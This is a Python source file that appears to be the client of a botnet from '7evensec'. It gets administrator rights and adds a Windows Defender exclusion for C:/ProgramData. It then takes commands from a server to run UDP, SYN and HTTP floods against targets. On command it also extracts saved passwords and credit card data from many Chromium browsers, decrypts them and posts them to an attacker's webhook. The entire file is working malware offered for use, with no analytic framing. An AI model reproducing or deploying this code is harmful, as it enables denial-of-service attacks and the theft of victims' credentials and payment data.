# Client
import os
import sys
import time
import json
import ctypes
import shutil
import socket
import base64
import sqlite3
import requests
import subprocess
from Crypto.Cipher import AES
from colorama import Fore, Style
from scapy.all import IP, TCP, send
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData

CONFIG_FOLDER = "C:/ProgramData/"
CONFIG_FILE = os.path.join(CONFIG_FOLDER, "config.txt")

def botnet():
    # Server configuration

    HOST = '127.0.0.1' # Put your server IP here
    PORT = 5555 

    print("Waiting for server...")

    def send_udp_packets(target_ip, target_port, data, duration):
        start_time = time.time()

        while time.time() - start_time < duration:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
                    udp_socket.sendto(data, (target_ip, target_port))
                print(f"Flooding {target_ip}:{target_port}.")
            except Exception as e:
                print(f"Error sending UDP packet: {e}")

    def send_syn_packets(destination_ip, destination_port, duration=5, interval=0.1):
        start_time = time.time()

        while time.time() - start_time < duration:
            packet = IP(dst=destination_ip) / TCP(dport=destination_port, flags="S")
            send(packet, verbose=0)
            print(f"Sent SYN packet to {destination_ip}:{destination_port}")
            time.sleep(interval)

    def send_post_requests(url, duration):
        duration = int(duration)  # seconds
        end_time = time.time() + duration

        while time.time() < end_time:
            response = requests.post(url,data={"message": "SUCK OUR DICKSSSSSSSS -7evensec"})
            print(f"Sent post requests to {url}")

    def send_get_requests(url, duration):
        duration = int(duration)  # seconds
        end_time = time.time() + duration

        while time.time() < end_time:
            response = requests.get(url,data={"message": "SUCK OUR DICKSSSSSSSS -7evensec"})
            print(f"Sent get requests to {url}")

    def steal(url):
        appdata = os.getenv('LOCALAPPDATA')
        
        def installed_browsers():
            available = []
            for x in browsers.keys():
                if os.path.exists(browsers[x]):
                    available.append(x)
            return available

        def get_master_key(path: str):
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return

            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            return key

        def decrypt_password(buff: bytes, key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def save_results(browser_name, content):
            if content is not None:
                with open('all_results.txt', 'a', encoding="utf-8") as file:
                    file.write(f"\n\n{browser_name} Results:\n{content}")
                print(f"\t [*] Appended results to all_results.txt")
            else:
                print(f"\t [-] No Data Found!")

        def get_data(path: str, profile: str, key, type_of_data):
            db_file = f'{path}\\{profile}{type_of_data["file"]}'
            if not os.path.exists(db_file):
                return
            result = ""
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
            os.remove('temp_db')
            return result

        def convert_chrome_time(chrome_time):
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

        if __name__ == '__main__':
            browsers = {
                'avast': appdata + '\\AVAST Software\\Browser\\User Data',
                'amigo': appdata + '\\Amigo\\User Data',
                'torch': appdata + '\\Torch\\User Data',
                'kometa': appdata + '\\Kometa\\User Data',
                'orbitum': appdata + '\\Orbitum\\User Data',
                'cent-browser': appdata + '\\CentBrowser\\User Data',
                '7star': appdata + '\\7Star\\7Star\\User Data',
                'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
                'vivaldi': appdata + '\\Vivaldi\\User Data',
                'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
                'google-chrome': appdata + '\\Google\\Chrome\\User Data',
                'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
                'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
                'uran': appdata + '\\uCozMedia\\Uran\\User Data',
                'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
                'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                'iridium': appdata + '\\Iridium\\User Data',
            }

            data_queries = {
                'login_data': {
                    'query': 'SELECT action_url, username_value, password_value FROM logins',
                    'file': '\\Login Data',
                    'columns': ['URL', 'Email', 'Password'],
                    'decrypt': True
                },
                'credit_cards': {
                    'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
                    'file': '\\Web Data',
                    'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
                    'decrypt': True
                },
            }

            appdata = os.getenv('LOCALAPPDATA')
            
            available_browsers = installed_browsers()

            for browser in available_browsers:
                browser_path = browsers[browser]
                master_key = get_master_key(browser_path)
                print(f"Getting Stored Details from {browser}")

                all_results = ""

                for data_type_name, data_type in data_queries.items():
                    print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
                    data = get_data(browser_path, "Default", master_key, data_type)
                    all_results += f"\n\n{browser} - {data_type_name.replace('_', ' ').capitalize()} Results:\n{data}"
                    print("\t------\n")

                save_results(browser, all_results)
                webhook_url = url
                file_path = 'all_results.txt'

                # Open the file in binary mode
                with open(file_path, 'rb') as file:
                    # Make a POST request to the webhook URL with the file
                    response = requests.post(webhook_url, files={'file': (file_path, file)})
                
                os.remove('all_results.txt')



    def connect_to_server():
        # Create a socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        connected = False

        while not connected:
            try:
                # Try to connect to the server
                client_socket.connect((HOST, PORT))
                connected = True
                print(f"{Fore.GREEN}Connected{Style.RESET_ALL}")  # Print connected message in green
            except Exception as e:
                time.sleep(1)

        return client_socket

    def main():
        while True:
            client_socket = connect_to_server()

            try:
                # Receive and print messages from the server
                while True:
                    data = client_socket.recv(1024).decode('utf-8').lower()
                    if data.startswith("attack"):
                        # Split the string by space and get the arguments after "attack"
                        arguments = data.split()[1:]
                        method = arguments[0]
                        if method == 'udp':
                            ip = arguments[1]
                            port = int(arguments[2])  
                            sec = int(arguments[3]) 
                            udp_data = b"STOP WATCHING NETWORK TRAFFIC - 7evensec"
                            send_udp_packets(ip, port, udp_data, sec)
                            # Send a message to the server indicating that the flood has stopped
                            client_socket.send("Flood stopped".encode('utf-8'))

                        elif method == 'syn':
                            ip = arguments[1]
                            port = int(arguments[2])  
                            sec = int(arguments[3]) 
                            send_syn_packets(destination_ip=ip,destination_port=port, duration=sec, interval=0.1)
                            # Send a message to the server indicating that the flood has stopped
                            client_socket.send("Flood stopped".encode('utf-8'))
                        
                        elif method == 'get':
                            ip = arguments[1]
                            sec = int(arguments[2])
                            send_get_requests(url=ip, duration=sec)
                            client_socket.send("Flood stopped".encode('utf-8'))

                        elif method == 'post':
                            ip = arguments[1]
                            sec = int(arguments[2])
                            send_post_requests(url=ip, duration=sec)
                            client_socket.send("Flood stopped".encode('utf-8'))

                        else:
                            pass

                    if data.startswith("steal"):
                        arguments = data.split()[1:]
                        if arguments[0]:
                            webhook = str(arguments[0])
                            steal(webhook)
                        else:
                            pass

            except Exception as e:
                print(f"{Fore.RED}Connection dropped. Retrying...{Style.RESET_ALL}")
            finally:
                # Close the socket before attempting to reconnect
                client_socket.close()

    if __name__ == "__main__":
        main()

def perm_check():

    def is_admin():
        try:
            # Check if the script is running with administrative privileges
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def run_as_admin():
        if sys.platform == 'win32':
            # Rerun the script as administrator
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    def read_config():
        try:
            with open(CONFIG_FILE, 'r') as file:
                return file.read().strip()
        except FileNotFoundError:
            return None

    def write_config():
        os.makedirs(CONFIG_FOLDER, exist_ok=True)
        with open(CONFIG_FILE, 'w') as file:
            file.write("Executed")

    def add_defender_exclusion(path):
        try:
            # Use PowerShell to add exclusion
            command = f'Add-MpPreference -ExclusionPath "{path}"'
            subprocess.run(["powershell", "-Command", command], check=True)
        except subprocess.CalledProcessError as e:
            print(f'Failed to add exclusion for {path}. Error: {e}')
            sys.exit(1)  # Exit the script with an error code

    def main():
        if not is_admin():
            ctypes.windll.user32.MessageBoxW(0, "This program requires administrative privileges. Please run as administrator.", "Admin Privileges Required", 1)
            run_as_admin()
        else:
            if read_config() is None:
                file_or_folder_path = r'C:/ProgramData/'
                add_defender_exclusion(file_or_folder_path)
                write_config()
                botnet()
            else:
                botnet()

    if __name__ == "__main__":
        main()


perm_check()
